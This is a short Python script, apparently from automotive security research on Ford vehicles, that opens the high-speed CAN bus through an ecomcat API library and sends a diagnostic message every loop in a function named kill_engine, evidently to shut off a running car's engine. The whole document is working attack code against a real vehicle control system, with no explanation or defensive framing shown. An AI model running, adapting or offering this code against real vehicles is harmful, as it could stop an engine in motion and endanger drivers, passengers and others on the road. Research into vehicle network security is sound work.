from FordStuff import *

def kill_engine(mydll, handle, time):
    y = pointer(SFFMessage())
    mydll.DbgLineToSFF("IDH: 07, IDL: E0, Len: 08, Data: 05 31 01 40 44 FF 00 00", y)
    mydll.write_message_cont(handle, y, time)
    
# initalize
mydll = CDLL('Debug\\ecomcat_api')
# HS CAN
handle = mydll.open_device(1,0)

while True:
    kill_engine(mydll, handle, 1000)

mydll.close_device(handle)
